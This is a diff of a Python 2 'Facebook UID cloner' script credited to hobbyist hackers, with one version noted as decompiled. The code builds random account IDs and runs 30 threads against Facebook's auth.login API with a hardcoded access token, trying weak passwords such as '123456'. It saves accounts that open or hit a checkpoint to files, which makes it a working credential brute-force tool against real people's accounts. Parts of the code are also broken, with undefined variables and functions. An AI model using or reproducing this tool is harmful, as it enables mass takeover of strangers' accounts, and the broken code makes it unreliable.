@@ -1,118 +1,136 @@
-#!/usr/bin/python 
-# -*- coding: utf-8
-import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass, uuid, requests, base64
-logo = '\x1b[1;92m /$$   /$$ /$$$$$$ /$$   /$$ /$$$$$$\n| $$$ | $$|_  $$_/| $$  /$$/|_  $$_/\n| $$$$| $$  | $$  | $$ /$$/   | $$\n| $$ $$ $$  | $$  | $$$$$/    | $$\n| $$  $$$$  | $$  | $$  $$    | $$\n| $$\  $$$  | $$  | $$\  $$   | $$\n| $$ \  $$ /$$$$$$| $$ \  $$ /$$$$$$\n|__/  \__/|______/|__/  \__/|______/\n                                        '
-logo1 = """
-\x1b[1;92m /$$   /$$ /$$$$$$ /$$   /$$ /$$$$$$
-| $$$ | $$|_  $$_/| $$  /$$/|_  $$_/
-| $$$$| $$  | $$  | $$ /$$/   | $$
-| $$ $$ $$  | $$  | $$$$$/    | $$
-| $$  $$$$  | $$  | $$  $$    | $$
-| $$\  $$$  | $$  | $$\  $$   | $$
-| $$ \  $$ /$$$$$$| $$ \  $$ /$$$$$$
-|__/  \__/|______/|__/  \__/|______/
- 
-\x1b[1;90m╔════════════════════════════════════════╗
-\x1b[1;93m|         \x1b[1;91m[\x1b[1;93m*\x1b[1;91m]\x1b[1;92m NIKI UID CLONER\x1b[1;91m [\x1b[1;93m*\x1b[1;91m]       \x1b[1;93m|
-\x1b[1;93m|\x1b[1;90m════════════════════════════════════════\x1b[1;93m| 
-\x1b[1;93m|\x1b[1;91m [\x1b[1;92m✓\x1b[1;91m]\x1b[1;92m AUTHOR   \x1b[1;91m> \x1b[1;92mMr. NIKI                \x1b[1;93m|
-\x1b[1;93m|\x1b[1;91m [\x1b[1;92m✓\x1b[1;91m]\x1b[1;92m YOUTUBE  \x1b[1;91m> \x1b[1;92mMr. NIKI                \x1b[1;93m|
-\x1b[1;93m|\x1b[1;91m [\x1b[1;92m✓\x1b[1;91m]\x1b[1;92m GITHUB   \x1b[1;91m> \x1b[1;92mNiki404-Cyber           \x1b[1;93m|
-\x1b[1;93m|\x1b[1;91m [\x1b[1;92m✓\x1b[1;91m]\x1b[1;92m FACEBOOK \x1b[1;91m> \x1b[1;92mMr. NIKI                \x1b[1;93m|
-\x1b[1;90m╚════════════════════════════════════════╝
-"""
-os.system('clear')
-print logo1
-print 48 * '\x1b[1;91m~'
-def tik():
-    titik = ['   ', '.  ', '.. ', '...', '.. ', '.  ', '   ']
-    for o in titik:
-        print '\r\x1b[1;91m [\x1b[1;92m*\x1b[1;91m]\x1b[1;92m Wait A Few Moments \x1b[1;93m' + o,
+# Decompile by Mardis (Tools By Kapten-Kaizo)
+# Time Succes decompile : 2022-04-16 08:17:05.143914
+import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
+os.system('rm -rf .txt')
+for n in range(90000):
+    nmbr = random.randint(11111, 99999)
+    sys.stdout = open('.txt', 'a')
+    print nmbr
+    sys.stdout.flush()
+
+try:
+    import requests
+except ImportError:
+    os.system('pip2 install mechanize')
+
+try:
+    import mechanize
+except ImportError:
+    os.system('pip2 install request')
+    time.sleep(1)
+    os.system('Then type: python2 boss')
+
+import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize
+from multiprocessing.pool import ThreadPool
+from requests.exceptions import ConnectionError
+from mechanize import Browser
+reload(sys)
+sys.setdefaultencoding('utf8')
+br = mechanize.Browser()
+br.set_handle_robots(False)
+br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
+br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
+br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
+
+def keluar():
+    print 'Thanks.'
+    os.sys.exit()
+
+
+def acak(b):
+    w = 'ahtdzjc'
+    d = ''
+    for i in x:
+        d += '!' + w[random.randint(0, len(w) - 1)] + i
+
+    return cetak(d)
+
+
+def cetak(b):
+    w = 'ahtdzjc'
+    for i in w:
+        j = w.index(i)
+        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))
+
+    x += '\x1b[0m'
+    x = x.replace('!0', '\x1b[0m')
+    sys.stdout.write(x + '\n')
+
+
+def jalan(z):
+    for e in z + '\n':
+        sys.stdout.write(e)
         sys.stdout.flush()
-        time.sleep(0.5)
+        time.sleep(0.1)
 
-fuck = []
 
-def jenw():
-    os.system('rm -rf .txt')
+def tik():
+    titik = [
+     '.   ', '..  ', '... ']
+    for o in titik:
+        print '\r\x1b[1;93mPlease Wait \x1b[1;91m' + o,
+        sys.stdout.flush()
+        time.sleep(1)
+
+
+back = 0
+oks = []
+id = []
+vulnot = '\x1b[31mNot Vuln'
+vuln = '\x1b[32mVuln'
+os.system('clear')
+print '\n\x1b[36m\n     # #    # ### #     #  #####\n      # #   #   #  ##    # #     #\n      # #  #    #  # #   # #\n      # ###     #  #  #  # #  ####\n#     # #  #    #  #   # # #     #\n#     # #   #   #  #    ## #     #\n #####  #    # ### #     #  #####                                             \n\x1b[33m______________________________________________________\n\n[*] DEVELOPER : AryanNafas\n[*] TELEGRAM  : AryanHack907\n[*] GITHIB    :   AryanHack907\n[*] TOOLS     : OLD ID CLON 2009\n\n[*] UPDATE : JKING-907\n\x1b[32m_____________________________________________________\n'
+logo1 = '\n\x1b[36m\n      # #    # ### #     #  #####\n      # #   #   #  ##    # #     #\n      # #  #    #  # #   # #\n      # ###     #  #  #  # #  ####\n#     # #  #    #  #   # # #     #\n#     # #   #   #  #    ## #     #\n #####  #    # ### #     #  #####\n                                                                                                  \n\x1b[33m______________________________________________________\n\n[*] DEVELOPER : AryanNafas\n[*] TELEGRAM : AryanHack907\n[*] GITHIB    : AryanHack907\n[*] TOOLS     : OLD ID CLON 2009\n\n[*] UPDATE : JKING-907\n\x1b[32m_____________________________________________________\n\n'
+logo2 = '\n\x1b[36m\n      # #    # ### #     #  #####\n      # #   #   #  ##    # #     #\n      # #  #    #  # #   # #\n      # ###     #  #  #  # #  ####\n#     # #  #    #  #   # # #     #\n#     # #   #   #  #    ## #     #\n #####  #    # ### #     #  #####                                                                                \n\x1b[33m______________________________________________________\n\n[*] DEVELOPER : AryanNafas\n[*] TELEGRAM : AryanNafas\n[*] GITHIB    : AryanHack907\n[*] TOOLS     : OLD ID CLON 2009\n\n[*] UPDATE : JKING-907\n\x1b[32m_____________________________________________________\n\n'
+
+def lisensi():
+    os.system('clear')
+    login()
+
+
+def login():
     os.system('clear')
     print logo1
-    print 48 * '\x1b[1;91m~'
-    print '\x1b[1;91m [\x1b[1;92m*\x1b[1;91m]\x1b[1;92m Set Phone Number Amount You Want To Clone\n\x1b[1;91m [\x1b[1;92m*\x1b[1;91m]\x1b[1;92m Example:1000,2000,10000,20000\n'
-    walid = input('\x1b[1;92m     Enter Amount\x1b[1;93m\xe2\x80\xa2\xe2\x9e\xa2 \x1b[1;96m')
-    tik()
-    for n in range(walid):
-        nmbr = random.randint(11111, 99999)
-        sys.stdout = open('.txt', 'a')
-        print nmbr
-        sys.stdout.flush()
-
-
-def main1():
-    if 1 in fuck:
-        os.system('#')
-    else:
-        os.system("clear")
-        print "\x1b[1;91mFuck Your Bypass System 🖕🖕🖕- Security By BNS Team"
-        exit()
-    os.system('clear')
-    print logo
-    print 47 * '\x1b[1;91m-'
-    print '\x1b[1;91m [\x1b[1;92m1\x1b[1;91m]\x1b[1;92m Start Cracking'
+    print '\x1b[1;32m[1]\x1b[1;33mSTART( \x1b[1;32mHACK)'
     time.sleep(0.05)
-    print '\x1b[1;91m [\x1b[1;92m0\x1b[1;91m]\x1b[1;92m Back'
+    print '\x1b[1;32m[2]\x1b[1;34mUPDATE (2.0)'
+    time.sleep(0.05)
+    print '\x1b[1;32m[0]\x1b[1;31mExit '
     pilih_login()
 
+
 def pilih_login():
-    if 1 in fuck:
-        os.system('#')
-    else:
-        os.system("clear")
-        print "\x1b[1;91mFuck Your Bypass System 🖕🖕🖕- Security By BNS Team"
-        exit()
-    peak = raw_input("\n\x1b[1;91m [\x1b[1;92m✓\x1b[1;91m]\x1b[1;92m CHOOSE : \x1b[1;92m")
-    if peak =="":
-        print "\x1b[1;92mFill In Correctly"
+    peak = raw_input('\n\x1b[1;95mCHOOSE: \x1b[1;34m')
+    if peak == '':
+        print '\x1b[1;97mFill In Correctly'
         pilih_login()
-    elif peak in ["1", "01"]:
+    elif peak == '1':
         Zeek()
+
+
 def Zeek():
     os.system('clear')
-    print logo
-    print 47 * '\x1b[1;92m-'
-    print '\x1b[1;91m [\x1b[1;92m1\x1b[1;91m]\x1b[1;92m START CRACK OLD \x1b[1;91m[\x1b[1;93m2009\x1b[1;91m]'
-    time.sleep(0.10)
-    print '\x1b[1;91m [\x1b[1;92m0\x1b[1;91m]\x1b[1;92m Back'
-    time.sleep(0.10)
+    print logo1
+    print '\x1b[1;33m[1]START CLONING 2004-2005'
+    time.sleep(0.1)
+    print '\x1b[1;33m[0]back'
+    time.sleep(0.05)
     action()
 
+
 def action():
-    if 1 in fuck:
-        os.system('#')
-    else:
-        os.system("clear")
-        print "\x1b[1;91mFuck Your Bypass System 🖕🖕🖕- Security By BNS Team"
-        exit()
-    if 1 in fuck:
-        os.system('#')
-    else:
-        os.system("clear")
-        print "\x1b[1;91mFuck Your Bypass System 🖕🖕🖕- Security By BNS Team"
-        exit()
-    peak = raw_input('\n\x1b[1;91m [\x1b[1;92m✓\x1b[1;91m]\x1b[1;92m CHOOSE : \x1b[1;92m')
-    if peak =='':
+    global oks
+    peak = raw_input('\n\x1b[1;32mCHOOSE:\x1b[1;32m')
+    if peak == '':
         print '[!] Fill In Correctly'
         action()
-    elif peak =="1":              
+    elif peak == '1':
         os.system('clear')
-        print logo
-        print 47 * '\x1b[1;91m-'
-        print '\x1b[1;91m [\x1b[1;92m✓\x1b[1;91m]\x1b[1;92m FACEBOOK UID ACCOUNT CLONER'
-        print '\x1b[1;91m [\x1b[1;92m✓\x1b[1;91m]\x1b[1;96m TYPE 2 DIGIT UID CODE'
-        print '\x1b[1;91m [\x1b[1;92m✓\x1b[1;91m]\x1b[1;92m 00,01,02,03,04,05,06,07,08,09,10'
-        print '\x1b[1;91m [\x1b[1;92m✓\x1b[1;91m]\x1b[1;93m 11,11,12,13,14,15,16,17,18,19,20'
+        print logo2
+        print '(1) 2009-10 [Enter - 00]' + '\n'
+        print '\x1b[1;35mEnter only 00 TO CLONE 2004-2005 ACCOUNT'
         try:
-            c = raw_input('\n\x1b[1;91m [\x1b[1;92m✓\x1b[1;91m]\x1b[1;92m CHOOSE : \x1b[1;92m')
+            c = raw_input('\x1b[1;32mCHOOSE : ')
             k = '1'
             idlist = '.txt'
             for line in open(idlist, 'r').readlines():
@@ -121,31 +139,30 @@ def action():
         except IOError:
             print '[!] File Not Found'
             raw_input('\n[ Back ]')
-            main1()
+            blackmafiax()
 
     elif peak == '0':
-        main1()
+        login()
     else:
         print '[!] Fill In Correctly'
         action()
-    print 48 * '\x1b[1;91m-'
+    print 50 * '\x1b[1;31m-'
     xxx = str(len(id))
-    jalan("\x1b[1;91m [\x1b[1;92m✓\x1b[1;91m]\x1b[1;92m TOTAL IDs NUMBER     : " + xxx)
-    time.sleep(0.5)
-    jalan("\x1b[1;91m [\x1b[1;92m✓\x1b[1;91m]\x1b[1;92m YOUR UID CHOOSE CODE : " + c)
-    time.sleep(0.5)
-    jalan("\x1b[1;91m [\x1b[1;92m✓\x1b[1;91m]\x1b[1;92m START UID ACCOUNT CRACKING...")
-    time.sleep(0.5)
-    jalan("\x1b[1;91m [\x1b[1;92m✓\x1b[1;91m]\x1b[1;92m TO STOP THIS PROCESS PRESS CTRL THEN z")
-    time.sleep(0.5)
-    print 47 * '\x1b[1;91m-'    
+    jalan('\x1b[1;32mTOTAL OLD IDZ NUMBER: ' + xxx)
+    jalan('\x1b[1;32mCODE YOU CHOOSE ' + c)
+    jalan('\x1b[1;32mWait A While \x1b[1;32mStart Cracking...')
+    jalan('\x1b[1;33mTo Stop Process Press Ctrl+z')
+    print 50 * '\x1b[1;35m-'
+
     def main(arg):
         user = arg
         try:
             os.mkdir('save')
         except OSError:
             pass
+
         try:
+
             pass1 = '123456'
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
             q = json.load(data)
@@ -192,17 +209,22 @@ def action():
                         cps = open('save/nikicp.txt', 'a')
                         cps.write(k + c + user + pass3 + '\n')
                         cps.close()
-                        cpb.append(c + user + pass3)
+                        cpb.append(c + user + pass3)    
         except:
             pass
 
     p = ThreadPool(30)
     p.map(main, id)
-    print 47 * ("\x1b[1;91m-")
-    print("\x1b[1;91m [\x1b[1;92m√\x1b[1;91m]\x1b[1;92m Process Has Been Complete")
-    print("\x1b[1;91m [\x1b[1;92m√\x1b[1;91m]\x1b[1;92m Total OK >\x1b[1;92m " + str(len(oks)))
-    print("\x1b[1;91m [\x1b[1;92m√\x1b[1;91m]\x1b[1;92m Total CP >\x1b[1;91m " + str(len(cps)))
-    print("\x1b[1;91m [\x1b[1;92m√\x1b[1;91m]\x1b[1;92m Thanks For Using My Tools")
-    print 47 * ("\x1b[1;91m-")
-    raw_input("\n\x1b[1;93m Press Enter To Back")
-    main1()
+    print 50 * '\x1b[1;32m-'
+    print 'Process Has Been Completed ...'
+    print 'Total Online/Offline : ' + str(len(oks)) + '/' + str(len(cpb))
+    print 'Cloned Accounts Has Been Saved : save/cloned.txt'
+    jalan('Note : Your Offline account Will Open after 4 days')
+    print ''
+    print '\n    \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\n\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91JKINGO \xe2\x95\x91\x1b[1;95mFb\x1b[1;97m \n\x1b[1;95m033[1;97m'
+    raw_input('\n\x1b[1;92m[\x1b[1;92mBack\x1b[1;95m]')
+    login()
+
+
+if __name__ == '__main__':
+    login()
